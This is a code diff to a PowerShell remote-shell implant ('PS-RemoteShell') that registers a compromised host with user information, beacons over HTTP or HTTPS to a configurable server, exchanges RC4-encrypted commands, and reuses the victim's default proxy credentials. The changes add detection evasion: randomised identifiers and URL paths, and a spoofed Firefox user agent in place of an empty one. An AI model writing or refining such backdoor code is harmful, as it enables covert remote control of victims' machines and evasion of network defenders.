@@ -128,12 +128,13 @@ function PS-RemoteShell {
 
 	PROCESS {
 		$Exit = $False
-		$Guid = [GUID]::NewGuid().ToString()
+		$Guid = Random-String -Length 16
 		$UserInfo = Get-UserInfo
 		$BodyData = "register $($Guid) $($UserInfo)"
 		(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 		
 		While($Exit -ne $True) {
+		  $Path = Random-String -Length $(Get-Random -Minimum 5 -Maximum 16)
 			if ($Protocol -eq "https") {
 				$Cert = @"
 					using System.Net;
@@ -154,10 +155,10 @@ function PS-RemoteShell {
 					
 			$Cmd = ""
 			Start-Sleep -m $Delay
-			$Url = "$($Protocol)://$($Ip):$($Port)/?$($Guid)"
+			$Url = "$($Protocol)://$($Ip):$($Port)/$($Path)?$($Guid)"
 			$BodyData = RC4-EncodeBase64 -Buffer $BodyData -Key $Key
 			Try {
-				$Data = Invoke-WebRequest -Uri $Url -Method POST -Body $BodyData -UserAgent "" -TimeoutSec 10 -UseBasicParsing
+				$Data = Invoke-WebRequest -Uri $Url -Method POST -Body $BodyData -UserAgent "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" -TimeoutSec 10 -UseBasicParsing
 				$Cmd = RC4-DecodeBase64 -Buffer $Data -Key $Key
 			} Catch {
 				$Cmd = ""
